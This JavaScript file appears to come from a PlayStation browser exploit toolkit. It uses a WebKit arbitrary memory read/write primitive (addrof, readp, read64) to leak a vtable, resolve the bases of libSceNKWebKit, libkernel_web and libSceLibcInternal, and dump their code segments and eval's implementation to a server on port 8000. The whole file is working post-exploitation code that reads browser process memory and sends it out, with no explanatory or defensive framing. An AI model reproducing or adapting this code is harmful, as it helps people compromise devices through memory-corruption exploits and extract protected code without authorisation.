import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { Addr, mem } from './module/mem.mjs';
import { make_buffer, find_base, resolve_import } from './module/memtools.mjs';
import { KB, MB } from './module/constants.mjs';

import {
    debug_log,
    align,
    die,
    send,
} from './module/utils.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const textarea = document.createElement('textarea');
// JSObject
const js_textarea = mem.addrof(textarea);
let libwebkit_base = null;

// boundaries of the .text + PT_SCE_RELRO portion of a module
function get_boundaries(leak) {
    const lib_base = find_base(leak, true, true);
    const lib_end = find_base(leak, false, false);

    return [lib_base, lib_end]
}

// dump a module's .text and PT_SCE_RELRO segments only
function dump(name, lib_base, lib_end) {
    // assumed size < 4GB
    const lib_size = lib_end.sub(lib_base).low();
    debug_log(`${name} base: ${lib_base}`);
    debug_log(`${name} size: ${lib_size}`);
    const lib = make_buffer(
        lib_base,
        lib_size
    );
    send(
        url,
        lib,
        `${name}.sprx.text_${lib_base}.bin`,
        () => debug_log(`${name} sent`)
    );
}

// dump for libSceNKWebKit.sprx
function dump_libwebkit() {
    let addr = js_textarea;
    // WebCore::HTMLTextAreaElement
    addr = addr.readp(0x18);

    // vtable for WebCore::HTMLTextAreaElement
    // in PT_SCE_RELRO segment (p_type = 0x6100_0010)
    addr = addr.readp(0);

    debug_log(`vtable: ${addr}`);
    const vtable = make_buffer(addr, 0x400);
    send(url, vtable, `vtable_${addr}.bin`, () => debug_log('vtable sent'));

    const [lib_base, lib_end] = get_boundaries(addr);
    dump('libSceNKWebKit', lib_base, lib_end);

    return lib_base;
}

// dump for libkernel_web.sprx
function dump_libkernel(libwebkit_base) {
    const offset = 0x8d8;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    // __stack_chk_fail
    const stack_chk_fail_import = libwebkit_base.add(offset);

    const libkernel_leak = resolve_import(stack_chk_fail_import);
    debug_log(`__stack_chk_fail import: ${libkernel_leak}`);

    const [lib_base, lib_end] = get_boundaries(libkernel_leak);
    dump('libkernel_web', lib_base, lib_end);
}

// dump for libSceLibcInternal.sprx
function dump_libc() {
    const offset = 0x8F8;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    const libwebkit_base = find_base(vtable_p, true, true);
    // memset
    const memset_import = libwebkit_base.add(offset);

    const libc_leak = resolve_import(memset_import);
    debug_log(`memset import: ${libc_leak}`);

    const [lib_base, lib_end] = get_boundaries(libc_leak);
    dump('libSceLibcInternal', lib_base, lib_end);
}

function dump_webkit() {
    libwebkit_base = dump_libwebkit();
    dump_libkernel(libwebkit_base);
    dump_libc(libwebkit_base);
}

function dump_eval() {
    const impl = mem.addrof(eval).readp(0x18).readp(0x38);
    const func = mem.addrof(eval).readp(0x18);
    for (let i = 0; i < 0x50; i += 8) {
        debug_log(`${i.toString(16).padStart(2, '0')}: ${func.read64(i)}`);
    }

    debug_log('sending');
    send(
        url,
        make_buffer(impl, 0x800),
        `eval_dump_addr_${impl}.bin`,
        () => debug_log('sent')
    );
}

dump_webkit();
dump_eval();
